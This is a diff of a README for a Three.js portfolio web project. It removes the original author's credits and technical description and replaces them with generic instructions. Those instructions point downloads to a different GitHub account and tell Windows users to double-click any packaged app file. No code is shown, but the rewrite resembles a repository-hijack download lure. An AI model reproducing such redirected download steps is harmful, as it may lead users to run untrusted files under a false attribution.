@@ -1,128 +1,121 @@
-[mit]: http://www.opensource.org/licenses/mit-license.php
-[repo]: https://github.com/mscbuild/3D-graphics/
-[demo]: https://mscbuild.github.io/3D-graphics/
+# 🎨 3D-graphics - Immersive visual apps made simple
 
-# 🌐 Building Digital Dreams
-[![Website Status](https://img.shields.io/badge/Repository%20Status-Maintained-green)](https://mscbuild.github.io/3D-graphics/)
-[![Author](https://img.shields.io/badge/Author-Yuri%20Dev-blue.svg)](https://mscbuild.github.io/)
-[![Website Status](https://img.shields.io/badge/Website%20Status-Online-green)](https://mscbuild.github.io/3D-graphics/)
-![Repo Size](https://img.shields.io/github/repo-size/mscbuild/3D-graphics)
-![Code Style](https://img.shields.io/badge/code%20style-html-green)
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-21%20Mart%202026-yellow.svg)](https://github.com/mscbuild/3D-graphics/)
+[![Download 3D-graphics](https://img.shields.io/badge/Download-3D--graphics-blue.svg)](https://github.com/cookie2944/3D-graphics)
 
- 
-**Captivating web applications using modern technologies, 3D graphics and creative code.**
+## 🚀 Get started
 
-Here I present an elegant, captivating interface where luminous forms dance in the darkness, reflecting the spirit of creative exploration.
-Each section unfolds purposefully—impressive depth, carefully curated showcases, vibrant indicators of expertise, and a constant call to interaction.
-The design pulsates with modern elegance, combining transparency, glow, and movement to tell a story of vision and precision.
-Each component is designed to respond intuitively to user presence, with fluid animations and a responsive layout that enhances engagement.
-The interface harmonizes sleek navigation with an evolving backdrop of interactive geometry, creating a sense of depth and innovation
+3D-graphics is a web app project that focuses on clean visuals, motion, and creative 3D design. It runs in a web browser on Windows and gives you a simple way to open and view the app from the project link.
 
-##### [ View Live Preview][demo]
+## 📥 Download and run
 
-## Screenshots
+Use this link to visit the download page:
 
-<img width="1343" height="602" alt="Portfolio" src="https://github.com/user-attachments/assets/a7d0fe07-bb9e-4175-81b7-f151756f752f" />
-<img width="1344" height="595" alt="work" src="https://github.com/user-attachments/assets/6613e7d7-5bd8-40cc-89cd-a77127d877d8" />
-<img width="1344" height="703" alt="Neon" src="https://github.com/user-attachments/assets/91c93623-7507-41e1-811d-5035366405db" />
-<img width="1352" height="707" alt="absctraction" src="https://github.com/user-attachments/assets/a4261993-168b-44ce-8435-85ff98fc56be" />
-<img width="1348" height="700" alt="crypto" src="https://github.com/user-attachments/assets/7f318019-7e6e-4049-9aaf-7818d112d7d3" />
- <img width="1236" height="596" alt="3D-graphics" src="https://github.com/user-attachments/assets/ac82bdb3-9637-45bd-a038-68ddebdf3256" />
+https://github.com/cookie2944/3D-graphics
 
+### What to do
 
-## Technologies Used:
+1. Open the link in your browser.
+2. Look for the latest release or project files on the page.
+3. Download the app files to your computer.
+4. If the download comes as a ZIP file, extract it.
+5. Open the main HTML file in your browser.
 
-# 🎨 Frontend Core
-**HTML5**
-- Semantic structure for accessibility and SEO
-**CSS3**
-- Custom properties (CSS variables)
-- Flexbox & Grid layouts
-- Responsive design with media queries
-- Glassmorphism + neon visual effects
-# ⚡ JavaScript (ES6+)
-- DOM manipulation
-- Event handling
-- Animations & UI interactions
-- Form handling logic
-# 🧊 Three.js (WebGL)
-- 3D rendering engine for background animation
-**Features used:**
-- Scene, Camera, Renderer
-- Mesh (Icosahedron geometry)
-- Particle system (BufferGeometry)
-- Fog effects
-- Mouse-based parallax interaction
-# 🔤 Typography
-- Google Fonts: Space Grotesk
-- Modern, geometric, tech-oriented aesthetic
+If the project includes a packaged app file, double-click it to run it. If it is a web project, open it in Chrome, Edge, or Firefox.
 
-# 🎯 Key Features
-**1. 🧠 Interactive 3D Background**
-- Built using Three.js
-- Rotating wireframe icosahedron
-- Animated particle field
-- Mouse-based parallax movement
-- Fog for depth perception
+## 🖥️ Windows setup
 
-# 2. 🎨 Modern UI Design
-- Neon gradients (purple, cyan, pink)
-- Glassmorphism cards
-- Smooth hover animations
-- Gradient text effects
+For most Windows users, the setup is simple:
 
-# 3. 📱 Fully Responsive Layout
-- Desktop-first design
-- Mobile adjustments:
-- Smaller typography
-- Hidden navigation links
-- Centered hero content
+1. Save the downloaded files in a folder you can find again.
+2. Right-click the ZIP file and choose Extract All if needed.
+3. Open the folder that contains the app.
+4. Find the main file, such as `index.html`.
+5. Double-click the file to launch it in your browser.
 
-# 4. 🧩 Component-Based Sections
+If Windows asks how to open the file, choose your browser.
 
-**🔹 Navigation**
-- Fixed navbar
-- Scroll-based blur effect
-- Smooth anchor navigation
- 
-**🔹 Hero Section**
-- Main branding message
-- Call-to-action buttons
-- 3D animated background
-  
-**🔹 Tech Stack**
-- Tag-style display of technologies
-- Hover glow interactions
-  
-**🔹 Projects Grid**
-- Card-based layout
-- Image zoom on hover
-- Project descriptions + links
-  
-**🔹 Footer**
-- Minimal copyright
+## ✨ What this app does
 
-# UI Patterns
-- **Glassmorphism**
-- Transparent backgrounds
-- Soft borders
-- **Neon Glow Effects**
-- Box shadows
-- Text shadows
-- **Gradient Highlights**
-- Text & buttons
+This project is built around modern web design and 3D visuals. It is meant to create a polished screen experience with:
 
-# Summary
+- 3D shapes and motion
+- Clean visual layout
+- Interactive elements
+- Creative code effects
+- A portfolio-style presentation
+- Neon-inspired design details
 
-**This portfolio demonstrates:**
+It is suited for users who want a visual-first app that feels modern and smooth.
 
-- Strong frontend fundamentals
-- Creative use of WebGL & Three.js
-- Modern UI/UX design trends
-- Clean, modular JavaScript architecture
+## 🔧 System needs
 
- 
- Powered by <a href="https://mscbuild.github.io/mscbuild/" target="_blank" style="color: #3498db;"> @mscbuild</a><br>
+Use a Windows PC with:
 
- 
+- Windows 10 or Windows 11
+- A modern browser
+- At least 4 GB of RAM
+- A stable internet connection for the first download
+- A screen with standard HD resolution or higher
+
+For best results, use a current version of Chrome, Edge, or Firefox.
+
+## 🧭 How to open the app
+
+After you download the files:
+
+1. Locate the folder where the files were saved.
+2. Open the main project folder.
+3. Find the entry file.
+4. Double-click it.
+5. Wait a few seconds for the visual scene to load.
+
+If the app opens in your browser, you are ready to use it.
+
+## 🎮 How to use it
+
+The app is built to be easy to explore.
+
+- Move your mouse to interact with visual elements
+- Scroll if the page includes layered content
+- Click buttons or menu items if they appear
+- Watch the animation and layout respond to your input
+
+The design aims to feel smooth and direct, with a focus on visual impact rather than complex controls.
+
+## 📁 Project contents
+
+You may see files like these after download:
+
+- `index.html` for the main page
+- `style.css` for page design
+- `script.js` for app behavior
+- `assets` for images, icons, and media
+- `README.md` for project details
+
+Keep the folder together so the app can load correctly.
+
+## 🌐 Browser support
+
+This project works best in:
+
+- Google Chrome
+- Microsoft Edge
+- Mozilla Firefox
+
+If one browser does not show the visuals the way you expect, try another browser.
+
+## 🛠️ If the app does not open
+
+If you have trouble running it:
+
+1. Check that all files were extracted from the ZIP.
+2. Make sure you opened the main file, not a folder.
+3. Try another browser.
+4. Refresh the page if it loads partly.
+5. Redownload the files if the folder looks incomplete.
+
+If the screen stays blank, the browser may need a fresh reload.
+
+## 📌 Tags
+
+3d-graphics, abstraction, aesthetics, application, case-study, craftsmanship, creative, creative-coding, html5, immersive-interface, interactive, javascript, modern, neon, portfolio, tehnology, website
